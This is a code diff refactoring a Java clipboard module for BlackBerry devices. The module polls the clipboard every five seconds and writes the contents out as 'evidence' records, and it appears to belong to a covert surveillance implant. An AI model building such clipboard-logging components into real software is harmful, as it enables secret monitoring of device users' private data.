@@ -12,11 +12,12 @@ package blackberry.module;
 import java.util.Vector;
 
 import net.rim.device.api.system.Clipboard;
-import blackberry.AgentManager;
-import blackberry.config.Conf;
+import blackberry.ModuleManager;
+import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
+import blackberry.evidence.EvidenceType;
 import blackberry.interfaces.UserAgent;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
@@ -34,38 +35,16 @@ public final class ModuleClipboard extends BaseModule implements UserAgent {
 
     private boolean clipSuspended;
 
-    /**
-     * Instantiates a new clip board agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     */
-    public ModuleClipboard(final boolean agentEnabled) {
-        super(BaseModule.AGENT_CLIPBOARD, agentEnabled, Conf.AGENT_CLIPBOARD_ON_SD,
-                "ClipBoardAgent");
-
-        //#ifdef CLIP_FORCED
-        enable(true);
-        //#endif
+    public static ModuleClipboard getInstance() {        
+        return (ModuleClipboard) ModuleManager.getInstance().get("clipboard");
     }
 
-    public static ModuleClipboard getInstance() {
-        return (ModuleClipboard) AgentManager.getInstance().getItem(
-                BaseModule.AGENT_CLIPBOARD);
-    }
 
-    /**
-     * Instantiates a new clip board agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     * @param confParams
-     *            the conf params
-     */
-    protected ModuleClipboard(final boolean agentStatus, final byte[] confParams) {
-        this(agentStatus);
-        parse(confParams);
+    public boolean parse(ConfModule conf) {
+        setPeriod(5000);
+        return true;
     }
+    
 
     public void actualStart() {
         //#ifdef DEBUG
@@ -73,17 +52,11 @@ public final class ModuleClipboard extends BaseModule implements UserAgent {
         //#endif
     }
 
-    public void actualStop() {
-        //#ifdef DEBUG
-        debug.trace("actualStop");
-        //#endif
-    }
-
     /*
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
-    public synchronized void actualRun() {
+    public synchronized void actualGo() {
         if(clipSuspended){
             return;
         }
@@ -99,24 +72,19 @@ public final class ModuleClipboard extends BaseModule implements UserAgent {
         }
     }
 
+
+    public void actualStop() {
+        //#ifdef DEBUG
+        debug.trace("actualStop");
+        //#endif
+    }
+
     public synchronized void setClip(String clip) {
         //#ifdef DEBUG
         debug.trace("setClip: " + clip);
         //#endif
         lastClip = clip;
         clipSuspended = false;
-    }
-
-    /*
-     * (non-Javadoc)
-     * @see blackberry.agent.Agent#parse(byte[])
-     */
-    protected boolean parse(final byte[] confParameters) {
-        //#ifdef DEBUG
-        debug.trace("parse");
-        //#endif
-        setPeriod(5000);
-        return true;
     }
 
     private void saveEvidence(String ret) {
@@ -133,6 +101,7 @@ public final class ModuleClipboard extends BaseModule implements UserAgent {
         items.addElement(payload);
         items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));
 
+        Evidence evidence = new Evidence(EvidenceType.CLIPBOARD);
         evidence.atomicWriteOnce(items);
 
     }
